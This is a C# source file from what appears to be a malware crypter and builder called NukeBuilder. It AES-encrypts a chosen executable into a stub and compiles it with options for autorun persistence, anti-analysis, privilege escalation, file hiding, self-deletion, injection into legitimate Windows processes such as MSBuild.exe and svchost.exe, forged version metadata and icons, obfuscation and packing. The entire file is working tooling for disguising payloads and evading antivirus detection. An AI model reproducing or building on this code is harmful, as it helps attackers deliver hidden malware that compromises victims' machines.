using Microsoft.CSharp;
using NukeBuilder.Algorithms.EncryptHelper;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using static NukeBuilder.Algorithms.Cryptor.Obfuscator;

namespace NukeBuilder.Algorithms.Cryptor
{
    internal class Compilator
    {
        private static Random random = new Random();


        public static string NetProcessRandom()
        {

            string[] PossibleProcessess = { "MSBuild.exe", "AppLaunch.exe", "aspnet_compiler.exe", "CasPol.exe",
            "cvtres.exe", "dfsvc.exe", "jsc.exe", "RegAsm.exe", "RegSvscs.exe", "vbc.exe"};

            string targetProcess = PossibleProcessess[random.Next(PossibleProcessess.Length)];
            return targetProcess;
        }        
        
        public static string NativeProcessRandom()
        {

            string[] PossibleProcessess = { 
            "\\\\wbem\\\\WmiPrvSE.exe", "svchost.exe", "notepad.exe", 
            "explorer.exe", "timeout.exe",
            "PING.exe", "bitsadmin.exe" };

            string targetProcess = PossibleProcessess[random.Next(PossibleProcessess.Length)];
            return targetProcess;
        }

        public static string CompileStub(string targetFile, bool Autorun, bool AntiAnalysis, bool RunAsAdmin, 
            bool HideFile, bool MutexControl, bool MeltFile, bool Native, 
            bool Net, bool Reflexion, bool UseObfuscation, bool UsePacker, 
            bool UseProtect, string IconFile, string AssemblyTxt)
        {
            string outName = Path.Combine(Path.GetDirectoryName(targetFile), AESEncrypt.GenerateRandStr(15) + ".exe");

            byte[] key = AESEncrypt.GenerateRandomBytes(32);
            byte[] iv = AESEncrypt.GenerateRandomBytes(16);
             
            byte[] payload = File.ReadAllBytes(targetFile);
            byte[] encPayload = AESEncrypt.EncryptPayload(payload, key, iv);

            string hexArray = AESEncrypt.GenerateHexArray(encPayload);

            string stubContent = Properties.Resources.Stub;

            stubContent = Regex.Replace(
                stubContent,
                @"public static byte\[\] HexPayload = new byte\[\] \{.*?\};",
                "public static byte[] HexPayload = " + hexArray,
                RegexOptions.Singleline
            );

            string newKey = "private static byte[] Key = new byte[] { " + string.Join(", ", key.Select(b => "0x" + b.ToString("X2"))) + " };";
            stubContent = Regex.Replace(
                stubContent,
                @"private static byte\[\] Key = new byte\[\] \{.*?\};",
                newKey,
                RegexOptions.Singleline
            );

            string newIV = "private static byte[] IV = new byte[] { " + string.Join(", ", iv.Select(b => "0x" + b.ToString("X2"))) + " };";
            stubContent = Regex.Replace(
                stubContent,
                @"private static byte\[\] IV = new byte\[\] \{.*?\};",
                newIV,
                RegexOptions.Singleline
            );

            var provider = new CSharpCodeProvider();
            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outName,
                CompilerOptions = "/platform:x86 -target:winexe",
                IncludeDebugInformation = false
            };

            if (!string.IsNullOrEmpty(AssemblyTxt) && File.Exists(AssemblyTxt))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(AssemblyTxt);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                stubContent = stubContent.Replace("%TITLE%", title);
                stubContent = stubContent.Replace("%DESC%", description);
                stubContent = stubContent.Replace("%COMPANY%", company);
                stubContent = stubContent.Replace("%PRODUCT%", product);
                stubContent = stubContent.Replace("%COPYRIGHT%", copyright);
                stubContent = stubContent.Replace("%TRADEMARK%", trademarks);
                stubContent = stubContent.Replace("%VERSION%", productVersion);
                stubContent = stubContent.Replace("%FILE_VERSION%", fileVersion);
            }

            if (Autorun)
            {
                parameters.CompilerOptions += " /define:Autorun";
            }

            if (RunAsAdmin)
            {
                parameters.CompilerOptions += " /define:RunAsAdmin";
            }

            if (MutexControl)
            {
                parameters.CompilerOptions += " /define:MutexControl";
                stubContent = stubContent.Replace("%MUTEX%", AESEncrypt.GenerateRandStr(8));
            }

            if (HideFile)
            {
                parameters.CompilerOptions += " /define:HideFile";
            }   

            if (AntiAnalysis)
            {
                parameters.CompilerOptions += " /define:AntiAnalysis";
            }

            if (MeltFile)
            {
                parameters.CompilerOptions += " /define:MeltFile";
            }

            if (Net)
            {
                parameters.CompilerOptions += " /define:NetInject";
                stubContent = stubContent.Replace("%RANDOM_NET_INJECT%", NetProcessRandom());
            }

            if (Native)
            {
                parameters.CompilerOptions += " /define:NativeInjection";
                stubContent = stubContent.Replace("%NATIVE_RANDOM_INJECT%", NativeProcessRandom());
            }

            if (Reflexion)
            {
                parameters.CompilerOptions += " /define:ReflexionInject";
            }

            if (UseProtect)
            {
                parameters.CompilerOptions += " /define:ProtectFunctions";

                string xorKey = "private static byte key = 0x" + XOREncrypt.XorKey.ToString("X2") + ";";
                stubContent = Regex.Replace(
                    stubContent,
                    @"private static byte key = 0x[0-9A-Fa-f]{2};",
                    xorKey,
                    RegexOptions.Singleline
                );

                stubContent = stubContent.Replace("%X%", XOREncrypt.EncryptChar);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");

            if (!string.IsNullOrEmpty(IconFile) && File.Exists(IconFile))
            {
                parameters.CompilerOptions += $" /win32icon:\"{IconFile}\"";
            }


            var results = provider.CompileAssemblyFromSource(parameters, stubContent);

            if (results.Errors.Count > 0)
            {
                foreach (CompilerError error in results.Errors)
                {
                    return $"Error ({error.ErrorNumber}): {error.ErrorText}\n{error.Line}";
                }
            }

            if (UseProtect)
            {
                Protector.PerformProtect(outName, XOREncrypt.XorKey);
            }

            if (UseObfuscation)
            {
                PerformObfuscation(outName);
            }

            if (UseProtect)
            {
                Protector.ProtectReactorStub(outName);
            }

            if (UsePacker)
            {
                PackerCompilator.PerformPacking(outName, UseProtect, IconFile, AssemblyTxt);

                if (UseProtect)
                {
                    Protector.PerformProtect(outName, XOREncrypt.XorKey);
                }

                if (UseObfuscation)
                {
                    PerformObfuscation(outName);
                }

                if (UseProtect)
                {
                    Protector.ProtectReactorPacker(outName);
                }
            }

            return $"Compilation successful! -> {outName}";
        }
    }
}